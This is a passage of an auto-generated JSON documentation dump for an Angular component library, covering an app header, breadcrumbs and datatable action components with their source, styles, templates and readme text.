            "sourceCode": "import { ChangeDetectionStrategy, ChangeDetectorRef, Component, Input, OnInit, ViewEncapsulation } from '@angular/core';\nimport { Breadcrumb } from '../sto-breadcrumbs/breadcrumb';\nimport { MatMenuPanel } from '@angular/material/menu';\nimport { StoThemeService } from '../theme/theme.service';\nimport { typography, TypographyName } from '../theme/models';\nimport { fromEvent, Observable } from 'rxjs';\nimport { filter, map, take } from 'rxjs/operators';\nimport { BreakpointObserver } from '@angular/cdk/layout';\n\n/**\n * StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio\n *\n * @example\n *\n * <sto-app-header [homeBreadCrumbConfig]=\"{ command: () => openDrawer() }\"\n *    [breadCrumbs]=\"[{ label: 'Planning', segment: 'planning' }]\">\n * </sto-app-header>\n */\n@Component({\n  selector: 'sto-app-header',\n  templateUrl: './sto-app-header.component.html',\n  styleUrls: [ './sto-app-header.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoAppHeaderComponent implements OnInit {\n  /**\n   * testEnvironment tells the header whether or not to style itself defining a test-environment\n   */\n  @Input()\n  testEnvironment: boolean;\n  /**\n   * If {@link testEnvironment} is true, this name is printed out centered on the header\n   */\n  @Input()\n  environmentName: string;\n  /**\n   * Input for user information menu.\n   */\n  @Input()\n  userMenu: MatMenuPanel;\n  /**\n   * Configuration that determines what to do when clicking the top-level menu icon\n   */\n  @Input()\n  homeBreadCrumbConfig: { command: () => void };\n  /**\n   * Configuration used to print out the relevant application breadcrumbs.\n   */\n  @Input()\n  breadCrumbs: Breadcrumb[];\n\n  public darkmode$: Observable<boolean>;\n  public isSmall$: Observable<boolean>;\n  public menuOpen: boolean;\n\n  constructor(\n    private themeService: StoThemeService,\n    private breakpointObserver: BreakpointObserver,\n    private cdr: ChangeDetectorRef\n  ) {\n  }\n\n  toggleTheme() {\n    const themeName = document.body.classList.contains('sto-dark-theme') ? 'light' : 'dark';\n    this.themeService.setTheme(themeName);\n  }\n\n  toggleTypography(className?: string) {\n    const small = className === typography.get('small');\n    const large = className === typography.get('large');\n    const typographyName: TypographyName = small ? 'small' : large ? 'large' : 'medium';\n    this.themeService.setTypography(typographyName);\n  }\n\n  toggleMenu(event: MouseEvent) {\n    this.menuOpen = !this.menuOpen;\n    if ( this.menuOpen ) {\n      fromEvent(document, 'click')\n        .pipe(\n          filter(e => e !== event),\n          filter(e => {\n            const t = e.target as HTMLElement;\n            if ( !t || !t.parentElement ) {\n              return true;\n            }\n            let parent = t;\n            let iterations = 0;\n            while ( parent.parentElement && iterations < 5 ) {\n              if ( parent.classList.contains('mat-menu-trigger') ) {\n                return false;\n              }\n              iterations = iterations + 1;\n              parent = parent?.parentElement;\n            }\n            return true;\n          }),\n          take(1)\n        )\n        .subscribe(() => {\n          this.menuOpen = false;\n          this.cdr.markForCheck();\n        });\n    }\n  }\n\n  ngOnInit(): void {\n    this.darkmode$ = this.themeService.getActiveTheme()\n      .pipe(map(theme => theme && theme.name === 'dark'));\n    this.isSmall$ = this.breakpointObserver.observe([ '(max-width: 500px)' ]).pipe(map(r => r.matches));\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "@use '~@angular/material' as mat;\n\n.sto-header {\n  @include mat.elevation(3);\n\n  display: flex;\n  flex: auto;\n  flex-direction: row;\n  align-items: center;\n  position: fixed;\n  top: 0;\n  width: 100%;\n  z-index: 50;\n\n  .sto-header__actions mat-icon {\n    margin: auto;\n  }\n\n  &__environment {\n    position: absolute;\n    width: 100%;\n    left: 0;\n    top: 0;\n    display: flex;\n    pointer-events: none;\n\n    &--label {\n      padding: 4px 8px;\n      text-transform: uppercase;\n      white-space: nowrap;\n      width: fit-content;\n      border-radius: 2px;\n      position: relative;\n      margin: auto;\n    }\n  }\n\n  .small-toggle {\n    margin-right: 6px;\n  }\n\n  &__actions {\n    display: flex;\n    align-items: center;\n    margin-right: 8px;\n\n    &--small {\n      flex-direction: column;\n      width: 48px;\n      height: auto;\n      //max-height: 0;\n      transform: scale(0);\n      opacity: 0;\n      transform-origin: top right;\n      overflow: hidden;\n      position: absolute;\n      right: -4px;\n      top: 50px;\n      z-index: 100;\n      border-radius: 2px;\n      transition: opacity 200ms linear;\n      @include mat.elevation(4);\n\n      button {\n        margin-left: 0 !important;\n        margin-right: 0 !important;\n      }\n\n      &--open {\n        transform: scale(1);\n        opacity: 1;\n        //height: auto;\n        //max-height: 200px;\n      }\n    }\n\n    button {\n      margin: 4px;\n\n      &:first-of-type {\n        margin-left: 0;\n      }\n\n      &:last-of-type {\n        margin-right: 0;\n      }\n    }\n  }\n}\n",
                    "styleUrl": "./sto-app-header.component.scss"
                }
            ],
            "stylesData": "",
            "jsdoctags": [
                {
                    "pos": 635,
                    "end": 645,
                    "flags": 0,
                    "kind": 288,
                    "atToken": {
                        "pos": 635,
                        "end": 636,
                        "flags": 0,
                        "kind": 57
                    },
                    "tagName": {
                        "pos": 636,
                        "end": 643,
                        "flags": 0,
                        "escapedText": "example"
                    },
                    "comment": "<sto-app-header [homeBreadCrumbConfig]=\"{ command: () => openDrawer() }\"\n    [breadCrumbs]=\"[{ label: 'Planning', segment: 'planning' }]\">\n</sto-app-header>"
                }
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "themeService",
                        "type": "StoThemeService"
                    },
                    {
                        "name": "breakpointObserver",
                        "type": "BreakpointObserver"
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef"
                    }
                ],
                "line": 55,
                "jsdoctags": [
                    {
                        "name": "themeService",
                        "type": "StoThemeService",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "breakpointObserver",
                        "type": "BreakpointObserver",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit"
            ],
            "readme": "<h3 id=\"stoappheader\">StoAppHeader</h3>\n<p>StoAppHeader is used as a header navigation bar, and in combination with StoBreadCrumbs, also allows you to have a trail of your navigation. </p>\n<p>The breadcrumb trail can be limitless in length, but current practice dictates that it only be 2 segments (Application name / Application section)</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-app-header [homeBreadCrumbConfig]=&quot;homeInfo&quot;\n[breadCrumbs]=&quot;[...]&quot;\n[testEnvironment]=&quot;true|false&quot;\nenvironmentName=&quot;Acceptance&quot;&gt;\nOther content can be placed here via projection\n&lt;/sto-app-header&gt;</code></pre></div><h5 id=\"inputs\">Inputs</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nhomeBreadCrumbConfig: {command: () =&gt; void};</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nbreadCrumbs: Breadcrumb[];</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\ntestEnvironment: boolean; // Should the navbar display as testenvironment</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nenvironmentName: string; // Name to be displayed as the active env (e.g acceptance, Systemtest etc)</code></pre></div><h5 id=\"additional-values\">Additional values</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">interface Breadcrumb {\n    label: string;\n    command?: Function;\n    segment?: string;\n}</code></pre></div>",
            "templateData": "<div class=\"sto-header\"\n     [class.sto-header--test-environment]=\"testEnvironment\">\n  <sto-breadcrumbs [home]=\"homeBreadCrumbConfig\"\n                   [model]=\"breadCrumbs\"></sto-breadcrumbs>\n  <div class=\"sto-header__environment\"\n       *ngIf=\"testEnvironment && environmentName && (isSmall$ | async) === false\">\n    <div class=\"sto-header__environment--label\">\n      {{environmentName}}\n    </div>\n  </div>\n  <span class=\"spacer\"></span>\n  <button mat-icon-button\n          class=\"small-toggle\"\n          *ngIf=\"isSmall$ | async\"\n          (click)=\"toggleMenu($event)\">\n    <mat-icon>more_vert</mat-icon>\n  </button>\n  <div class=\"sto-header__actions\"\n       [class.sto-header__actions--small--open]=\"menuOpen\"\n       [class.sto-header__actions--small]=\"isSmall$ | async\">\n    <ng-content></ng-content>\n    <button mat-icon-button\n            title=\"Accessibility\"\n            [matMenuTriggerFor]=\"menu\">\n      <mat-icon>accessibility</mat-icon>\n    </button>\n    <button mat-icon-button\n            title=\"Account\"\n            *ngIf=\"userMenu\"\n            [matMenuTriggerFor]=\"userMenu\">\n      <mat-icon>account_circle</mat-icon>\n    </button>\n  </div>\n</div>\n\n<mat-menu #menu=\"matMenu\"\n          [yPosition]=\"(isSmall$ | async) ? 'above' : 'below'\">\n  <button mat-menu-item\n          class=\"dense\"\n          (click)=\"toggleTheme()\">\n    <mat-icon>{{ (darkmode$ | async) ? 'wb_sunny' : 'nights_stay' }}</mat-icon>\n    {{(darkmode$ | async) ? 'Disable' : 'Enable'}} night mode\n  </button>\n  <button mat-menu-item\n          class=\"dense\"\n          [matMenuTriggerFor]=\"fontMenu\">\n    <mat-icon>format_size</mat-icon>\n    Font size\n  </button>\n</mat-menu>\n<mat-menu #fontMenu=\"matMenu\">\n  <button mat-menu-item\n          class=\"dense\"\n          style=\"font-size: 10px\"\n          (click)=\"toggleTypography('sto-sm-typography')\">\n    Smaller\n  </button>\n  <button mat-menu-item\n          class=\"dense\"\n          style=\"font-size: 13px\"\n          (click)=\"toggleTypography()\">\n    Regular\n  </button>\n  <button mat-menu-item\n          class=\"dense\"\n          style=\"font-size: 16px\"\n          (click)=\"toggleTypography('sto-l-typography')\">\n    Larger\n  </button>\n</mat-menu>\n"
        },
        {
            "name": "StoBreadcrumbsComponent",
            "id": "component-StoBreadcrumbsComponent-85212df28cf34b78eccabd23f9954e51",
            "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.component.ts",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-breadcrumbs",
            "styleUrls": [
                "./sto-breadcrumbs.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-breadcrumbs.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "home",
                    "description": "<p>An object that can contain a url segment or a command.</p>\n",
                    "line": 45,
                    "type": "any"
                },
                {
                    "name": "homeicon",
                    "defaultValue": "'apps'",
                    "line": 38
                },
                {
                    "name": "homeIcon",
                    "defaultValue": "'home'",
                    "line": 60
                },
                {
                    "name": "model",
                    "description": "<p>A list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n",
                    "line": 22,
                    "type": "any[]"
                },
                {
                    "name": "style",
                    "description": "<p>DEPRECATED</p>\n",
                    "line": 50,
                    "type": "any"
                },
                {
                    "name": "styleClass",
                    "description": "<p>DEPRECATED</p>\n",
                    "line": 54,
                    "type": "string"
                },
                {
                    "name": "svgIcon",
                    "defaultValue": "false",
                    "line": 40
                }
            ],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "_model",
                    "type": "any[]",
                    "optional": false,
                    "description": "",
                    "line": 34,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "iconConfig",
                    "type": "literal type",
                    "optional": false,
                    "description": "",
                    "line": 61,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "title",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 35,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "itemClick",
                    "args": [
                        {
                            "name": "event",
                            "type": "Event"
                        },
                        {
                            "name": "item",
                            "type": "Breadcrumb"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 67,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "Event",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "item",
                            "type": "Breadcrumb",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 102
                },
                {
                    "name": "onHomeClick",
                    "args": [
                        {
                            "name": "event",
                            "type": "Event"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 96,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "Event",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [
                {
                    "name": "class.sto-breadcrumb",
                    "defaultValue": "true",
                    "line": 32
                }
            ],
            "hostListeners": [],
            "description": "<p>Breadcrumbs is the navigation scheme that reveals the user&#39;s location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).</p>\n",
            "rawdescription": "Breadcrumbs is the navigation scheme that reveals the user's location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).",
            "type": "component",
            "sourceCode": "import { Component, EventEmitter, HostBinding, Inject, Input, OnDestroy, Optional, ViewEncapsulation } from '@angular/core';\nimport { Router } from '@angular/router';\n\nimport { Breadcrumb, BreadcrumbConfig, NAVIGATION_HOME_ICON } from './breadcrumb';\n\n/**\n * Breadcrumbs is the navigation scheme that reveals the user's location on the web application.\n * It shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).\n */\n@Component({\n  selector: 'sto-breadcrumbs',\n  templateUrl: './sto-breadcrumbs.component.html',\n  styleUrls: [ './sto-breadcrumbs.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n})\nexport class StoBreadcrumbsComponent implements OnDestroy {\n\n  /**\n   * A list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\n   */\n  @Input() get model(): any[] {\n    return this._model;\n  }\n\n  set model(model: any[]) {\n    this.title = ( model || [] ).map(e => e.label || '').join(' / ');\n    this._model = model;\n  }\n\n  @HostBinding('class.sto-breadcrumb')\n  css = true;\n\n  private _model: any[];\n  public title: string;\n\n  @Input()\n  homeicon = 'apps';\n  @Input()\n  svgIcon = false;\n\n  /**\n   * An object that can contain a url segment or a command.\n   */\n  @Input() home: any;\n\n  /**\n   * DEPRECATED\n   */\n  @Input() style: any;\n  /**\n   * DEPRECATED\n   */\n  @Input() styleClass: string;\n  /**\n   * @DEPRECATED\n   * The material icon that is show top left\n   *  {string}\n   */\n  @Input() homeIcon = 'home';\n  public iconConfig: { icon?: string; svgIcon?: string; text?: string; };\n\n  constructor(private router: Router, @Inject(NAVIGATION_HOME_ICON) @Optional() iconConfig: BreadcrumbConfig) {\n    this.iconConfig = iconConfig || { icon: 'apps' };\n  }\n\n  itemClick(event: Event, item: Breadcrumb) {\n    if ( !item ) {\n      return;\n    }\n    if ( item.disabled ) {\n      event.preventDefault();\n      return;\n    }\n\n    if ( !item.url ) {\n      event.preventDefault();\n    }\n\n    if ( item.command ) {\n      if ( !item.eventEmitter ) {\n        item.eventEmitter = new EventEmitter();\n        item.eventEmitter.subscribe(item.command);\n      }\n\n      item.eventEmitter.emit({\n        originalEvent: event,\n        item\n      });\n    } else if ( item.segment ) {\n      this.router.navigate([ item.segment ], { queryParamsHandling: 'preserve' })\n        .catch(console.error);\n    }\n  }\n\n  onHomeClick(event: Event) {\n    if ( this.home ) {\n      this.itemClick(event, this.home);\n    }\n  }\n\n  ngOnDestroy() {\n    if ( this.model ) {\n      for ( const item of this.model ) {\n        if ( item.eventEmitter ) {\n          item.eventEmitter.unsubscribe();\n        }\n      }\n    }\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".sto-breadcrumb {\n  display: flex;\n  align-items: center;\n  justify-content: left;\n  font-weight: 500;\n  overflow: hidden;\n\n  &__home {\n    min-width: 52px;\n    justify-content: space-around;\n    display: flex;\n    align-items: center;\n    cursor: pointer;\n\n    &__title {\n      margin-right: 16px;\n    }\n\n    &__icon {\n      margin: auto 16px;\n    }\n  }\n\n  &__list {\n    margin: 0;\n    padding-left: 8px;\n    white-space: nowrap;\n    overflow: hidden;\n    display: inline;\n    align-items: center;\n    flex: 0 1 auto;\n    text-overflow: ellipsis;\n\n    .separator {\n      padding: 0 8px;\n      font-weight: 400;\n    }\n\n    &__item {\n\n      font-weight: 500;\n\n      &:first-of-type {\n        font-weight: bold;\n      }\n\n      cursor: pointer;\n      text-decoration: none;\n\n      &--last {\n        cursor: default;\n      }\n    }\n  }\n}\n\n",
                    "styleUrl": "./sto-breadcrumbs.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "router",
                        "type": "Router"
                    },
                    {
                        "name": "iconConfig",
                        "type": "BreadcrumbConfig"
                    }
                ],
                "line": 61,
                "jsdoctags": [
                    {
                        "name": "router",
                        "type": "Router",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "iconConfig",
                        "type": "BreadcrumbConfig",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnDestroy"
            ],
            "accessors": {
                "model": {
                    "name": "model",
                    "setSignature": {
                        "name": "model",
                        "type": "void",
                        "args": [
                            {
                                "name": "model",
                                "type": "[]"
                            }
                        ],
                        "returnType": "void",
                        "line": 26,
                        "jsdoctags": [
                            {
                                "name": "model",
                                "type": "[]",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                }
            },
            "readme": "<h4 id=\"stobreadcrumbs\">StoBreadCrumbs</h4>\n<p>Breadcrumbs is the navigation scheme that reveals the user&#39;s location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-breadcrumbs [home]=&quot;{command = () =&gt; {...}&quot; [model]=&quot;[{label: &#39;Home&#39;, segment: &#39;home&#39;}, {label: &#39;Inventory&#39;, segment: &#39;inventory&#39;}]&quot;&gt;&lt;/sto-breadcrumbs&gt;</code></pre></div><p>#####model\nA list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">[\n   {label: &quot;IM - OPS&quot;, command: () =&gt; {...}},\n   {label: &quot;Inventory overview&quot;, segment: &quot;overview&quot;}\n]</code></pre></div><p>#####home\nAn object that can contain a url segment or a command.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">{\n    command: () =&gt; {\n      this.store.dispatch(new SwitchNavigationMenuAction(&#39;left&#39;));\n      this.store.dispatch(new OpenNavigationAction(true));\n    }\n  }</code></pre></div>",
            "templateData": "<div class=\"sto-breadcrumb__home\"\n     (click)=\"itemClick($event, home)\">\n  <mat-icon class=\"sto-breadcrumb__home__icon\"\n            *ngIf=\"iconConfig.svgIcon\"\n            [svgIcon]=\"iconConfig.svgIcon\">\n  </mat-icon>\n  <mat-icon class=\"sto-breadcrumb__home__icon\"\n            *ngIf=\"!iconConfig.svgIcon\">{{ iconConfig.icon }}\n  </mat-icon>\n  <span class=\"sto-breadcrumb__home__title\"\n        *ngIf=\"iconConfig.text\">{{iconConfig.text}}</span>\n</div>\n<div class=\"sto-breadcrumb__list\"\n     [title]=\"title\"\n     style=\"position: relative\">\n  <ng-container *ngFor=\"let item of model; let index = index; let last = last\">\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\n       [title]=\"item.label\"\n       (click)=\"itemClick($event, item)\">\n      {{ item.label}}\n    </a>\n    <span class=\"separator\"\n          *ngIf=\"!last\"> /\n    </span>\n  </ng-container>\n</div>\n"
        },
        {
            "name": "StoDatatableActionsComponent",
            "id": "component-StoDatatableActionsComponent-1b7e91d62b4898d3beb72aa1d0cef0aa",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-actions",
            "styleUrls": [
                "./sto-datatable-actions.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-datatable-actions.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "height",
                    "defaultValue": "40",
                    "line": 14
                }
            ],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-mdl-table__actions",
                    "defaultValue": "true",
                    "line": 11
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\n\n@Component({\n  selector: 'sto-datatable-actions',\n  templateUrl: './sto-datatable-actions.component.html',\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\n})\n\nexport class StoDatatableActionsComponent {\n  @HostBinding('class.sto-mdl-table__actions')\n  getClass = true;\n  @HostBinding('style.height.px')\n  @Input()\n  height = 40;\n\n}\n\n@Component({\n  selector: 'sto-datatable-actions-left',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsLeftComponent {\n  @HostBinding('class.sto-mdl-table__actions__left')\n  getClass = true;\n}\n\n@Component({\n  selector: 'sto-datatable-actions-right',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsRightComponent {\n  @HostBinding('class.sto-mdl-table__actions__right')\n  getClass = true;\n}\n\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "",
                    "styleUrl": "./sto-datatable-actions.component.scss"
                }
            ],
            "stylesData": "",
            "templateData": "<ng-content select=\"sto-datatable-actions-left\"></ng-content>\n<ng-content select=\"sto-datatable-actions-right\"></ng-content>\n"
        },
        {
            "name": "StoDataTableActionsLeftComponent",
            "id": "component-StoDataTableActionsLeftComponent-1b7e91d62b4898d3beb72aa1d0cef0aa",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-actions-left",
            "styleUrls": [],
            "styles": [],
            "template": "<ng-content></ng-content>",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-mdl-table__actions__left",
                    "defaultValue": "true",
                    "line": 25
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\n\n@Component({\n  selector: 'sto-datatable-actions',\n  templateUrl: './sto-datatable-actions.component.html',\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\n})\n\nexport class StoDatatableActionsComponent {\n  @HostBinding('class.sto-mdl-table__actions')\n  getClass = true;\n  @HostBinding('style.height.px')\n  @Input()\n  height = 40;\n\n}\n\n@Component({\n  selector: 'sto-datatable-actions-left',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsLeftComponent {\n  @HostBinding('class.sto-mdl-table__actions__left')\n  getClass = true;\n}\n\n@Component({\n  selector: 'sto-datatable-actions-right',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsRightComponent {\n  @HostBinding('class.sto-mdl-table__actions__right')\n  getClass = true;\n}\n\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": ""
        },
        {
            "name": "StoDataTableActionsRightComponent",
            "id": "component-StoDataTableActionsRightComponent-1b7e91d62b4898d3beb72aa1d0cef0aa",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-actions-right",
            "styleUrls": [],
            "styles": [],
            "template": "<ng-content></ng-content>",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-mdl-table__actions__right",
                    "defaultValue": "true",
                    "line": 35
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\n\n@Component({\n  selector: 'sto-datatable-actions',\n  templateUrl: './sto-datatable-actions.component.html',\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\n})\n\nexport class StoDatatableActionsComponent {\n  @HostBinding('class.sto-mdl-table__actions')\n  getClass = true;\n  @HostBinding('style.height.px')\n  @Input()\n  height = 40;\n\n}\n\n@Component({\n  selector: 'sto-datatable-actions-left',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsLeftComponent {\n  @HostBinding('class.sto-mdl-table__actions__left')\n  getClass = true;\n}\n\n@Component({\n  selector: 'sto-datatable-actions-right',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsRightComponent {\n  @HostBinding('class.sto-mdl-table__actions__right')\n  getClass = true;\n}\n\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": ""
        },
        {
            "name": "StoDatatableBodyComponent",
            "id": "component-StoDatatableBodyComponent-96bc6fd93a63c6b969b965fc74daf91b",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-body",
            "styleUrls": [
                "./sto-datatable-body.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-datatable-body.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "columnMode",
                    "line": 75,
                    "type": "ColumnDisplay"
                },
                {
                    "name": "columns",
                    "line": 71,
                    "type": "Column[]"
                },
                {
                    "name": "disableRipple",
                    "line": 53,
                    "type": "boolean"
                },
                {
                    "name": "hasFooter",
                    "line": 85,
                    "type": "boolean"
                },
                {
                    "name": "height",
                    "line": 59,
                    "type": "number | null"
                },
                {
                    "name": "responsive",
                    "line": 51,
                    "type": "boolean"
                },
                {
                    "name": "responsiveView",
                    "line": 57,
                    "type": "TemplateRef<unknown>"
                },
                {
                    "name": "rowClass",
                    "line": 79,
                    "type": "rowClassFn"
                },
                {
                    "name": "rowHeight",
                    "line": 67,
                    "type": "number"
                },
                {
                    "name": "rows",
                    "line": 61,
                    "type": "Array<T>"
                },
                {
                    "name": "scrollbarH",
                    "line": 30,
                    "type": "boolean"
                },
                {
                    "name": "scrollLeft",
                    "line": 83,
                    "type": "string | null"
                },
                {
                    "name": "selectable",
                    "line": 63,
                    "type": "boolean"
                },
                {
                    "name": "selected",
                    "line": 69,
                    "type": "T"
                },
                {
                    "name": "selectionMode",
                    "line": 81,
                    "type": "SelectionModes"
                },
                {
                    "name": "smallView",
                    "line": 55,
                    "type": "boolean"
                },
                {
                    "name": "trackBy",
                    "defaultValue": "(index: number, item: T) => {\n    return index;\n  }",
                    "line": 125
                },
                {
                    "name": "virtualScroll",
                    "line": 73,
                    "type": "boolean"
                },
                {
                    "name": "width",
                    "line": 65,
                    "type": "string"
                }
            ],
            "outputsClass": [
                {
                    "name": "activate",
                    "defaultValue": "new EventEmitter<RowActivation<T>>()",
                    "line": 91,
                    "type": "EventEmitter"
                },
                {
                    "name": "rowContextMenu",
                    "defaultValue": "new EventEmitter<RowContextMenu<T>>()",
                    "line": 89,
                    "type": "EventEmitter"
                },
                {
                    "name": "rowSelected",
                    "defaultValue": "new EventEmitter<RowSelection<T>>()",
                    "line": 87,
                    "type": "EventEmitter"
                },
                {
                    "name": "scrollHeader",
                    "defaultValue": "new EventEmitter<Event>()",
                    "line": 93,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_rowClass",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 128
                },
                {
                    "name": "_scrollbarH",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 77,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 99,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "horizontalScrollActive",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 103,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "resizeObserver",
                    "type": "ResizeObserver",
                    "optional": false,
                    "description": "",
                    "line": 102,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "rowDiffer",
                    "type": "KeyValueDiffer<T | T>",
                    "optional": false,
                    "description": "",
                    "line": 100,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "scrollElement",
                    "type": "ElementRef<HTMLElement>",
                    "optional": false,
                    "description": "",
                    "line": 49,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'scrollViewport', {read: ElementRef}"
                        }
                    ]
                },
                {
                    "name": "scroller",
                    "type": "ElementRef<HTMLDivElement>",
                    "optional": false,
                    "description": "",
                    "line": 97,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'scroller'"
                        }
                    ]
                },
                {
                    "name": "timeout",
                    "type": "number | undefined",
                    "optional": false,
                    "description": "",
                    "line": 101,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "verticalScrollOffset",
                    "defaultValue": "0",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 104,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "vScroller",
                    "type": "CdkVirtualScrollViewport",
                    "optional": false,
                    "description": "",
                    "line": 95,
